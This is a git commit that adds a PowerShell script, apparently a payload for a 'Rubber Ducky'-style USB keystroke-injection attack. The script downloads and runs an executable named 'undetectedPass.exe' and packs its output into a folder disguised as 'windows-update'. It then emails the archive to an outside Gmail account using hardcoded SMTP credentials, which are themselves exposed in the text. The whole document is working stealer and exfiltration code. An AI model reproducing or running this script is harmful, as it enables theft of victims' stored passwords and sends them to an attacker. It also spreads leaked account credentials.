96b393948f47c4108f8ecdac04711ea4e22b5b2e
RRR3d <105751665+RRR3d@users.noreply.github.com>
2023-07-10 22:28:50 +0300

    added alot more stuff

---
+++ ExtractAndSendv2.ps1
@@ -0,0 +1,31 @@
+$URL = 'https://github.com/RRR3d/ArduinoRubberDucky/raw/main/undetectedPass.exe'
+$FilePath = "$env:USERPROFILE\Documents\pass.exe"
+$Command = "$FilePath --zip --dir $env:USERPROFILE\Documents\windows-update"
+
+# Download the file
+Invoke-WebRequest -Uri $URL -OutFile $FilePath
+
+# Run the command
+Start-Process -FilePath $FilePath -ArgumentList $Command -Wait
+
+$Username = 'xpharoh1@gmail.com'
+$Password = 'wypuwcjskmqelujk'
+$EmailFrom = 'xpharoh1@gmail.com'
+$EmailTo = 'xpharoh@gmail.com'
+$Subject = 'URGENT-MSG'
+$Body = 'PLEASE CHECK THE ATTACHED FILE'
+$SMTPServer = 'smtp.gmail.com'
+$SMTPPort = 587
+$Attachment = Join-Path $env:USERPROFILE\Documents\windows-update 'windows-update.zip'
+
+$SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort)
+$SMTPClient.EnableSsl = $true
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $Password)
+$Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
+$AttachmentData = [System.IO.File]::ReadAllBytes($Attachment)
+$AttachmentBase64 = [System.Convert]::ToBase64String($AttachmentData)
+$AttachmentStream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String($AttachmentBase64))
+$Attachment = New-Object System.Net.Mail.Attachment($AttachmentStream, 'windows-update', 'application/octet-stream')
+$Message.Attachments.Add($Attachment)
+
+$SMTPClient.Send($Message)
